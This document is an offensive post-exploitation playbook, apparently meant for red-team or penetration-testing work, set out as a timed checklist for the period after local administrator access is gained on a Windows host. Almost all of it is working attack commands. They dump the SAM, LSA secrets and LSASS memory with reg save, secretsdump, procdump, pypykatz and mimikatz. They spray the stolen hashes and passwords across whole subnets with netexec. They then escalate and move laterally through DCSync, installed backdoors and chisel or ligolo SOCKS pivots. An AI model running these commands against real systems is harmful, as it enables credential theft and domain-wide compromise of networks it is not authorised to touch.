# Playbook: Local Admin Obtained

## Minute 0: Confirm Access Level

```
[ ] whoami → user
[ ] net localgroup administrators → Verify admin group
[ ] whoami /groups → Check domain groups
[ ] systeminfo → OS/build/patches
```

## Minute 5: Credential Dump

```
[ ] SAM dump:
    reg save HKLM\SAM sam.hive
    reg save HKLM\SYSTEM system.hive
    reg save HKLM\SECURITY security.hive
    → secretsdump.py -sam sam.hive -system system.hive LOCAL

[ ] LSASS dump (if admin):
    procdump.exe -ma lsass.exe lsass.dmp
    → pypykatz lsa minidump lsass.dmp
    OR: mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

[ ] LSA secrets:
    reg save HKLM\SECURITY security.hive
    → secretsdump.py -security security.hive -system system.hive LOCAL
```

## Minute 15: Password Sweep

```
[ ] Test LOCAL ADMIN hash on ALL hosts:
    netexec smb <subnet>/24 -u Administrator -H hash --local-auth
    netexec winrm <subnet>/24 -u Administrator -H hash --local-auth

[ ] Test domain user password on ALL hosts:
    netexec smb <subnet>/24 -u domain_user -p pass --continue-on-success
    netexec winrm <subnet>/24 -u domain_user -p pass --continue-on-success

[ ] Extract any cached domain creds:
    secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL
    Grep for domain\username in output
```

## Minute 30: Lateral Movement

```
[ ] If domain creds found in LSASS:
    [ ] Test on DC (SMB/WinRM)
    [ ] BloodHound collection + analysis
    [ ] DCSync if domain admin

[ ] If only local admin:
    [ ] Install persistence (backdoor)
    [ ] Use host as pivot point
    [ ] Scan internal networks from this position
    [ ] Check for dual-homed interfaces

[ ] Pivot setup:
    [ ] Upload chisel/ligolo
    [ ] Check ipconfig for additional subnets
    [ ] Start SOCKS proxy
```

## Milestone Checks
- [ ] Domain creds found in LSASS? → Test on DC immediately
- [ ] Local admin hash works on other hosts? → Repeat LSASS on each
- [ ] No domain info? → This host is isolated → Pivot path
- [ ] Dual-homed? → New subnet to enumerate
